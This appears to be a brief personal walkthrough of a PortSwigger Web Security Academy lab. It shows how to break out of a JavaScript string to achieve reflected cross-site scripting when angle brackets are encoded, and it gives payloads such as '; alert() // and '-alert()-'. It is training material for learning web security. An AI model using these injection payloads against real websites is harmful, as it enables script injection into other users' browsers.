https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.

1) search fot something like "test" 
2) in the source page you can see that test is reflected into variable of a script
    <script>
        var searchTerms = 'test';
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
    </script>

3) now if we try to inject 'test we can see that we are able to break the string
    
    var searchTerms = '' test ';

    so we can try to inject a script

    ' </script> <script>alert()</script>
    
    BUT < and > are encoded


4) so try to inject directly the alert function 
    
    '; alert() //         -> var searchTerms = ''; alert() //;
 
    OR

    '-alert()-'           -> var searchTerms = ''-alert()-'';
